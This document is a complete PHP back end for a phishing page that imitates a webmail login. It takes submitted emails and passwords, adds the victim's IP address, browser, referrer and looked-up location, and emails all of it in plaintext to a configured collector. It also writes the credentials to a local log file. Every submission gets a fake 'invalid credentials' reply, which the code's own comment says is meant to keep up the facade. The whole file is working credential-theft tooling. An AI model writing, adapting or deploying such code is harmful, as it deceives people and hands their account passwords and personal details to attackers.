<?php
// Load configuration
$config = file_exists('config.php') ? include 'config.php' : [];

// Disable error reporting for production
error_reporting(0);
ini_set('display_errors', 0);

// Set content type to JSON
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// SMTP Configuration - loaded from config file or fallback to defaults
$smtp_host = $config['smtp']['host'] ?? 'smtp.gmail.com';
$smtp_port = $config['smtp']['port'] ?? 587;
$smtp_username = $config['smtp']['username'] ?? 'your-email@gmail.com';
$smtp_password = $config['smtp']['password'] ?? 'your-app-password';
$smtp_from_email = $config['smtp']['from_email'] ?? 'your-email@gmail.com';
$smtp_from_name = $config['smtp']['from_name'] ?? 'Webmail Logger';

// Email settings
$log_email = $config['logging']['log_email'] ?? 'logs@yourdomain.com';
$subject = $config['logging']['subject'] ?? 'Webmail Login Attempt';
$log_file = $config['logging']['backup_file'] ?? 'login_logs.txt';

// Security settings
$simulate_delay = $config['security']['simulate_delay'] ?? 2;
$allowed_domains = $config['security']['allowed_domains'] ?? [];

// Messages
$messages = $config['messages'] ?? [
    'invalid_credentials' => 'Invalid email or password. Please check your credentials and try again.',
    'missing_fields' => 'Email and password are required.',
    'invalid_email' => 'Invalid email format.',
    'invalid_domain' => 'Email domain not allowed.'
];

// Function to send email via SMTP
function sendSMTPEmail($to, $subject, $message, $from_email, $from_name) {
    global $smtp_host, $smtp_port, $smtp_username, $smtp_password;
    
    // Create email headers
    $headers = array(
        'MIME-Version: 1.0',
        'Content-type: text/html; charset=UTF-8',
        "From: $from_name <$from_email>",
        "Reply-To: $from_email",
        "X-Mailer: PHP/" . phpversion()
    );
    
    // Try using mail() function first (if available)
    if (function_exists('mail')) {
        $header_string = implode("\r\n", $headers);
        if (mail($to, $subject, $message, $header_string)) {
            return true;
        }
    }
    
    // If mail() fails or is not available, try socket-based SMTP
    return sendSocketSMTP($to, $subject, $message, $from_email, $from_name);
}

// Socket-based SMTP function
function sendSocketSMTP($to, $subject, $message, $from_email, $from_name) {
    global $smtp_host, $smtp_port, $smtp_username, $smtp_password;
    
    try {
        // Create socket connection
        $socket = fsockopen($smtp_host, $smtp_port, $errno, $errstr, 30);
        if (!$socket) {
            return false;
        }
        
        // Read initial response
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '220') {
            fclose($socket);
            return false;
        }
        
        // EHLO command
        fputs($socket, "EHLO " . $_SERVER['HTTP_HOST'] . "\r\n");
        $response = fgets($socket, 512);
        
        // Start TLS if port 587
        if ($smtp_port == 587) {
            fputs($socket, "STARTTLS\r\n");
            $response = fgets($socket, 512);
            if (substr($response, 0, 3) != '220') {
                fclose($socket);
                return false;
            }
            
            // Enable crypto
            if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
                fclose($socket);
                return false;
            }
            
            // EHLO again after TLS
            fputs($socket, "EHLO " . $_SERVER['HTTP_HOST'] . "\r\n");
            $response = fgets($socket, 512);
        }
        
        // Authentication
        fputs($socket, "AUTH LOGIN\r\n");
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '334') {
            fclose($socket);
            return false;
        }
        
        fputs($socket, base64_encode($smtp_username) . "\r\n");
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '334') {
            fclose($socket);
            return false;
        }
        
        fputs($socket, base64_encode($smtp_password) . "\r\n");
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '235') {
            fclose($socket);
            return false;
        }
        
        // Send email
        fputs($socket, "MAIL FROM: <$from_email>\r\n");
        $response = fgets($socket, 512);
        
        fputs($socket, "RCPT TO: <$to>\r\n");
        $response = fgets($socket, 512);
        
        fputs($socket, "DATA\r\n");
        $response = fgets($socket, 512);
        
        // Email content
        $email_content = "From: $from_name <$from_email>\r\n";
        $email_content .= "To: $to\r\n";
        $email_content .= "Subject: $subject\r\n";
        $email_content .= "MIME-Version: 1.0\r\n";
        $email_content .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
        $email_content .= $message . "\r\n.\r\n";
        
        fputs($socket, $email_content);
        $response = fgets($socket, 512);
        
        fputs($socket, "QUIT\r\n");
        fclose($socket);
        
        return substr($response, 0, 3) == '250';
        
    } catch (Exception $e) {
        return false;
    }
}

// Function to get client IP
function getClientIP() {
    $ip_keys = array('HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR');
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to get user agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// Function to get geolocation info (basic)
function getLocationInfo($ip) {
    if ($ip === 'Unknown' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return 'Location: Unknown';
    }
    
    // Using a free IP geolocation service
    $location_data = @file_get_contents("http://ip-api.com/json/$ip");
    if ($location_data) {
        $location = json_decode($location_data, true);
        if ($location && $location['status'] === 'success') {
            return "Location: {$location['city']}, {$location['regionName']}, {$location['country']} ({$location['isp']})";
        }
    }
    return 'Location: Unknown';
}

// Main processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        echo json_encode([
            'signal' => 'ERROR',
            'msg' => $messages['missing_fields']
        ]);
        exit;
    }
    
    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode([
            'signal' => 'ERROR',
            'msg' => $messages['invalid_email']
        ]);
        exit;
    }
    
    // Check domain restrictions if configured
    if (!empty($allowed_domains)) {
        $email_domain = strtolower(substr(strrchr($email, "@"), 1));
        if (!in_array($email_domain, array_map('strtolower', $allowed_domains))) {
            echo json_encode([
                'signal' => 'ERROR',
                'msg' => $messages['invalid_domain']
            ]);
            exit;
        }
    }
    
    // Collect additional information
    $ip_address = getClientIP();
    $user_agent = getUserAgent();
    $timestamp = date('Y-m-d H:i:s T');
    $location_info = getLocationInfo($ip_address);
    
    // Create log message
    $log_message = "
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .credentials { background-color: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 15px 0; }
            .info { background-color: #d1ecf1; padding: 15px; border-left: 4px solid #bee5eb; margin: 15px 0; }
            .label { font-weight: bold; color: #495057; }
            .value { color: #212529; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class='header'>
            <h2>🔐 Webmail Login Attempt Logged</h2>
            <p>A new login attempt has been recorded on your webmail system.</p>
        </div>
        
        <div class='credentials'>
            <h3>📧 Login Credentials</h3>
            <div class='value'><span class='label'>Email:</span> $email</div>
            <div class='value'><span class='label'>Password:</span> $password</div>
        </div>
        
        <div class='info'>
            <h3>🌐 Connection Details</h3>
            <div class='value'><span class='label'>IP Address:</span> $ip_address</div>
            <div class='value'><span class='label'>Timestamp:</span> $timestamp</div>
            <div class='value'><span class='label'>User Agent:</span> $user_agent</div>
            <div class='value'><span class='label'>$location_info</span></div>
            <div class='value'><span class='label'>Referrer:</span> " . ($_SERVER['HTTP_REFERER'] ?? 'Direct Access') . "</div>
        </div>
        
        <div style='margin-top: 20px; padding: 10px; background-color: #f8f9fa; border-radius: 5px; font-size: 12px; color: #6c757d;'>
            <p>This email was automatically generated by the webmail logging system.</p>
        </div>
    </body>
    </html>";
    
    // Try to send the email
    $email_sent = sendSMTPEmail($log_email, $subject, $log_message, $smtp_from_email, $smtp_from_name);
    
    // Also log to file as backup
    $file_log = date('Y-m-d H:i:s') . " | IP: $ip_address | Email: $email | Password: $password | UA: $user_agent\n";
    @file_put_contents($log_file, $file_log, FILE_APPEND | LOCK_EX);
    
    // Simulate authentication delay
    sleep($simulate_delay);
    
    // Always return an authentication error to maintain the facade
    echo json_encode([
        'signal' => 'ERROR',
        'msg' => $messages['invalid_credentials']
    ]);
    
} else {
    // Invalid request method
    echo json_encode([
        'signal' => 'ERROR',
        'msg' => 'Invalid request method.'
    ]);
}
?>